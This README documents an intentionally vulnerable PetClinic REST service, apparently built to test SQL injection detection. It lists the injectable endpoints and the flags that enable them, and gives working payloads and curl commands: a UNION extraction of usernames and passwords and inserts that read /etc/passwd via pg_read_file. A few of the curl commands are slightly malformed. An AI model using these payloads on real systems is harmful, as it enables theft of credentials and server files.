# Endpoints vulnerable for SQLi

This project has the following endpoints:
```shell
GET: /oops
POST: /owners
GET: /owners
GET: /owners/{ownerId}
PUT: /owners/{ownerId}
DELETE: /owners/{ownerId}
POST: /owners/{ownerId}/pets
GET: /owners/{ownerId}/pets/{petId}
PUT: /owners/{ownerId}/pets/{petId}
POST: /owners/{ownerId}/pets/{petId}/visits
GET: /pettypes
POST: /pettypes
GET: /pettypes/{petTypeId}
PUT: /pettypes/{petTypeId}
DELETE: /pettypes/{petTypeId}
GET: /pets
POST: /pets
GET: /pets/{petId}
PUT: /pets/{petId}
DELETE: /pets/{petId}
GET: /visits
POST: /visits
GET: /visits/{visitId}
PUT: /visits/{visitId}
DELETE: /visits/{visitId}
GET: /specialties
POST: /specialties
GET: /specialties/{specialtyId}
PUT: /specialties/{specialtyId}
DELETE: /specialties/{specialtyId}
GET: /vets
POST: /vets
GET: /vets/{vetId}
PUT: /vets/{vetId}
DELETE: /vets/{vetId}
POST: /users
```

Out of these, some are made vulnerable to SQL injection:
```HTTP
# other table data (UNION)
GET: /vets/{vetId}
# subvert logic
GET: /specialties/{specialtyId} 
# (hidden) inserting data
POST: /vets

# Deeper insert
POST: /owners
PUT /owners/{ownerId}
```

To enable a vulnerability, set `feature.unsafe` to the desired target in `application.properties`.
One can also disable SQLi detection using `feature.sqli.detection=false`.
This can be done by passing command line arguments, e.g.:
```shell
# All vulnerabilities
java -jar petclinic.jar --feature.unsafe=all
# Specific vulnerability
java -jar petclinic.jar --feature.unsafe=vuln4
```

All targets have the same path prefix, i.e.:
`PREFIX=org.springframework.samples.petclinic.repository.jdbc.`

## Endpoints with shallow depth
These vulnerable endpoints don't have deep code execution and all detect
multiple rows as SQLi, so payloads work internally, but don't always
return data in the HTTP response.

### Vulnerability 1: `GET /vets/{vetId}`
This vulnerability allows for UNION attacks, allowing an attacker to retrieve
data from other tables.

- operation: `getVet`
- payload: `0' UNION SELECT NULL,username,password FROM users--`
- target: `$PREFIX + JdbcVetRepositoryImpl:vulnFindById`

```shell
curl -i -s -k -X $'GET' \
  -H $'Host: localhost:9966' \
  $'http://localhost:9966/petclinic/api/vets/0\'%20UNION%20SELECT%20NULL,username,password%20FROM%20users--'
```

### Vulnerability 2: `GET /specialties/{specialtyId}`
This vulnerability allows for subverting logic, allowing an attacker to retrieve
hidden data. 

- operation: `getSpecialty`
- payload: `4'--`
- target: `$PREFIX + JdbcSpecialtyRepositoryImpl:vulnFindById`

```shell
curl -i -s -k -X $'GET' \
  -H $'Host: localhost:9966'
  $'http://localhost:9966/petclinic/api/specialties/4\'--'
```
 
### Vulnerability 3: `POST /vets`
This vulnerability allows for inserting data, allowing an attacker to create
a new user with, e.g., leaked data. 

- operation: `addVet`
- payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
- target: `$PREFIX + JdbcVetRepositoryImpl:vulnSave`

```json
{
  "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--",
  "lastName": "",
  "specialties": [
    {
      "name": "hacker"
    }
  ]
}
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Accept: application/json'-H $'Host: localhost:9966' -H $'Content-Length: 168' \
    --data-binary $'{\x0a  \"firstName\": \"hack\', (SELECT LEFT(pg_read_file(\'/etc/passwd\'), 30)) ) RETURNING id--\",\x0a  \"lastName\": \"\",\x0a  \"specialties\": [\x0a    {\x0a      \"name\": \"hacker\"\x0a    }\x0a  ]\x0a}' \
    $'http://localhost:9966/petclinic/api/vets'
```

## Endpoints with deeper execution paths
These vulnerable endpoints deeper code path executions.

[//]: # (all detect multiple rows as SQLi, so payloads work internally, but don't always return data in the HTTP response.)

### Vulnerability 4 & 5: `POST /owners`
This vulnerability is the same as [Vulnerability 3](#vulnerability-3-post-vets), but with a deeper code paths.
This is achieved by splitting `vulnSave` into `vulnStoreNewOwner` and `vulnUpdateExistingOwner`.

`vuln4` is when sending a new owner.
`vuln5` is when sending an existing owner.

- operation: `addOwner`
- payload: `hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)) ) RETURNING id--`
- target 4: `$PREFIX + JdbcOwnerRepositoryImpl:vulnStoreNewOwner`
- target 5: `$PREFIX + JdbcOwnerRepositoryImpl:vulnUpdateExistingOwner`

```json
{
  "firstName": "hack', (SELECT LEFT(pg_read_file('/etc/passwd'), 30)), 'addr', 'city', '42') RETURNING id--",
  "lastName": "",
  "address": "",
  "city": "",
  "telephone": ""
}
```

```shell
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Accept: application/json'-H $'Host: localhost:9966' -H $'Content-Length: 168' \
    --data-binary $'{\x0d\x0a  \"firstName\": \"hack\', (SELECT LEFT(pg_read_file(\'/etc/passwd\'), 30)), \'addr\', \'city\', \'42\') RETURNING id--\",\x0d\x0a  \"lastName\": \"\",\x0d\x0a  \"address\": \"\",\x0d\x0a  \"city\": \"\",\x0d\x0a  \"telephone\": \"\"\x0d\x0a}\x0d\x0a' \
    $'http://localhost:9966/petclinic/api/owners'
```

### Vulnerability 6 & 7: `PUT /owners/{ownerId}`
This vulnerability leverages the same injection as [Vulnerability 4 & 5](#vulnerability-4--5-post-owners),
but with deeper code execution paths. I.e., a faulty ownerId will cause shallower execution.

`vuln6` is when sending a new owner.
`vuln7` is when sending an existing owner.

- operation: `updateOwner`
- target 6: `$PREFIX + JdbcOwnerRepositoryImpl:vulnStoreNewOwner`
- target 7: `$PREFIX + JdbcOwnerRepositoryImpl:vulnUpdateExistingOwner`
